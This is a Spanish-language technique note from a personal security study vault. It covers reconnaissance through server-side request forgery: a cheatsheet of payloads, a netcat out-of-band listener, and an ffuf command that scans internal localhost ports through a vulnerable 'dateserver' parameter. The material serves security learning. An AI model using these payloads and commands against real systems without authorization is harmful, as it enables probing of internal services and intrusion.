---
aliases: null
tags:
  - type/technique
  - vuln/ssrf
  - technique/lateral-movement
  - asset/web-app
type: Technique
linked:
  - '[[Server-Side Request Forgery (SSRF)]]'
  - '[[SSRF - CWES]]'
---
# SSRF - Reconocimiento

***

## Cheatsheet

|**Etapa**|**Objetivo**|**Acción / Payload**|**Indicador de Éxito / Resultado**|
|---|---|---|---|
|**1. Identificación**|Detectar parámetros sospechosos.|Observar peticiones HTTP (ej. en [[Burp Suite]]). Buscar parámetros que acepten URLs o nombres de host (ej. `dateserver`).|La aplicación procesa la solicitud y devuelve información basada en el parámetro.|
|**2. Confirmación (Out-of-Band)**|Verificar si el servidor realiza peticiones externas.|**Payload:** `http://<MI_IP>:8000/ssrf`<br><br>  <br><br>**Listener:** `nc -lnvp 8000`|Se recibe una conexión HTTP en el listener de `netcat` proveniente del servidor objetivo.|
|**3. Verificación de Respuesta**|Determinar si es Blind SSRF o si hay retorno visual.|**Payload:** `http://127.0.0.1/index.php` (o la misma URL de la app).|La respuesta HTTP contiene el código HTML de la propia aplicación. Si se ve el contenido, **no** es Blind SSRF.|
|**4. Enumeración de Puertos**|Escanear servicios internos en el servidor (localhost).|Utilizar el SSRF para apuntar a `http://127.0.0.1:<PUERTO>`.|Diferencia en la respuesta entre puertos abiertos y cerrados (ej. mensaje de error vs. código 200/404 o contenido vacío).|
^ssrf-reconocimiento

## Automatización con FFUF

Para la etapa de enumeración de puertos internos, es eficiente utilizar [[Fuzzing]] para iterar sobre un rango de puertos y filtrar las respuestas que indican conexión fallida.

### Generación de Wordlist

Primero generamos una lista de puertos (ej. los primeros 10,000):
```Bash
seq 1 10000 > ports.txt
```

### Ejecución del Fuzzer

Utilizamos `ffuf` inyectando el punto de fuzzing (`FUZZ`) en el puerto de la URL interna. Filtramos las respuestas que contienen el mensaje de error conocido (ej. "Failed to connect").
```Bash
ffuf -w ./ports.txt \
     -u http://<TARGET_IP>/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
     -fr "Failed to connect to"
```

**Parámetros clave:**
- `-w`: Archivo de lista de puertos.
- `-d`: Datos del POST donde inyectamos el payload SSRF (`http://127.0.0.1:FUZZ/`).
- `-fr`: Filter Regex. Filtra (oculta) las respuestas que coinciden con el error de conexión, dejando visibles solo los puertos abiertos.

### Resultados Comunes

- **Puerto 80:** Servidor web interno.
- **Puerto 3306:** Base de datos [[MySQL]].
- **Otros servicios:** Paneles de administración internos o APIs no expuestas públicamente.
